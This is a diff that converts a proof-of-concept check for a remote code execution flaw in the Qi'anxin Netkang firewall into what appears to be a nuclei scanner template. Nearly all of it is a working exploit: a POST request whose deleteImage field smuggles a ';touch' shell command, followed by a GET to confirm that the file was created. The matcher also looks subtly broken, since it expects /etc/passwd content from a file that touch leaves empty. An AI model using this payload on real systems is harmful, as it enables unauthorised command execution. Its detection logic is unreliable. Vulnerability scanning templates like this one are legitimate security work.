@@ -8,21 +8,35 @@ info:
     Qi'anxin Netkang Next Generation Firewall is susceptible to remote code execution.
   reference:
     - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-77
+  tags: rce,firewall,intrusive
+  metadata:
+    max-request: 2
 
-set:
-    randstr: randomLowercase(20)
-rules:
-    r0:
-        request:
-            method: POST
-            path: /directdata/direct/router
-            body: |
-                {"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;touch /var/www/html/{{randstr}}.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}
-        expression: response.status == 200
-    r1:
-        request:
-            method: GET
-            path: /{{randstr}}.txt
-        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
-expression: r0() && r1()
+http:
+  - raw:
+      - |
+        POST /directdata/direct/router HTTP/1.1
+        Host: {{Hostname}}
 
+        {"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;touch /var/www/html/{{randstr}}.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}
+
+      - |
+        GET /{{randstr}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/05/30
